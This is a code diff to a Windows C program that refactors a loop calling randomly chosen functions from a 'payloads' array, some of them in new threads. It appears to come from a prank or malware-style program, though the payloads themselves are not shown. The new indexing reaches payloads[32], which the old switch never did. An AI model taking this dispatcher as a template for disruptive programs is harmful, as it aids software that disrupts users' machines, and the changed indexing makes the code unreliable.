@@ -253,106 +253,11 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     }
 
     fori(64) {
-        switch(rand() % 32) {
-            case 1:
-                payloads[1]();
-                break;
-            case 2:
-                payloads[2]();
-                break;
-            case 3:
-                payloads[3]();
-                break;
-            case 4:
-                payloads[4]();
-                break;
-            case 5:
-                payloads[5]();
-                break;
-            case 6:
-                payloads[6]();
-                break;
-            case 7:
-                payloads[7]();
-                break;
-            case 8:
-                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[8], NULL, NULL, NULL);
-                break;
-            case 9:
-                payloads[9]();
-                break;
-            case 10:
-                payloads[10]();
-                break;
-            case 11:
-                payloads[11]();
-                break;
-            case 12:
-                payloads[12]();
-                break;
-            case 13:
-                payloads[13]();
-                break;
-            case 14:
-                payloads[14]();
-                break;
-            case 15:
-                payloads[15]();
-                break;
-            case 16:
-                payloads[16]();
-                break;
-            case 17:
-                payloads[17]();
-                break;
-            case 18:
-                payloads[18]();
-                break;
-            case 19:
-                payloads[19]();
-                break;
-            case 20:
-                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[20], NULL, 0, NULL);
-                break;
-            case 21:
-                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[21], NULL, 0, NULL);
-                break;
-            case 22:
-                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[22], NULL, 0, NULL);
-                break;
-            case 23:
-                payloads[23]();
-                break;
-            case 24:
-                payloads[24]();
-                break;
-            case 25:
-                payloads[25]();
-                break;
-            case 26:
-                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[26], NULL, 0, NULL);
-                break;
-            case 27:
-                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[27], NULL, 0, NULL);
-                break;
-            case 28:
-                payloads[28]();
-                break;
-            case 29:
-                payloads[29]();
-                break;
-            case 30:
-                payloads[30]();
-                break;
-            case 31:
-                payloads[31]();
-                break;
-            case 32:
-                payloads[32]();
-                break;
-            default:
-                break;
-        }
+        int r = rand() % 32 + 1;
+        if (r == 8 || r == 20 || r == 21 || r == 22 || r == 26 || r == 27)
+            CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[r], NULL, 0, NULL);
+        else
+            payloads[r]();
     }
     
 
